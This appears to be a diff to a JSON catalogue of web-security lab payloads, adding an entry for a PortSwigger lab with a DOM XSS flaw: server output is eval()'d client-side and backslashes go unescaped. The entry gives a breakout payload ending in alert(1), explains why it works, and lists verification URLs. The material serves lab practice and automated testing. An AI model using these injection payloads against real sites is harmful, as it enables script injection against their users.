@@ -509,5 +509,18 @@
       "url": "http://localhost:8084/xvwa/vulnerabilities/dom_xss/?search={payload}",
       "match": "localhost"
     }
+  },
+  {
+    "id": "auto-20261031143203",
+    "context": "PortSwigger mystery lab: blog site. /search-results?search= returns JSON {\"results\":[],\"searchTerm\":\"X\"} which is eval()'d client-side by searchResults.js via eval('var searchResultsObj = '+responseText). Server escapes \" -> \\\" but does NOT escape backslash. A trailing backslash escapes the closing quote.",
+    "reference_payload": "?search=\\\";};alert(1);//",
+    "principle": "DOM XSS via eval of JSON. Server escapes \" to \\\" but leaves \\ raw. Sending \\\" yields \\\\\" — the literal backslash escapes+closes the string cleanly, then } closes object, then inject ;alert(1);//. Payload: \\\"};alert(1);// -> eval sees {\"results\":[],\"searchTerm\":\"\\\\\"};alert(1);//\"}",
+    "source": "portswigger",
+    "verify_url": "https://0a6d0079043dfebb80b05dec003d0057.web-security-academy.net/?search=%5c%22%7d%3balert(1)%3b%2f%2f",
+    "evidence": {
+      "match": "1",
+      "url": "https://0a6d0079043dfebb80b05dec003d0057.web-security-academy.net/?search=%5c%22%7d%3balert(1)%3b%2f%2f",
+      "verify": "alert"
+    }
   }
 ]
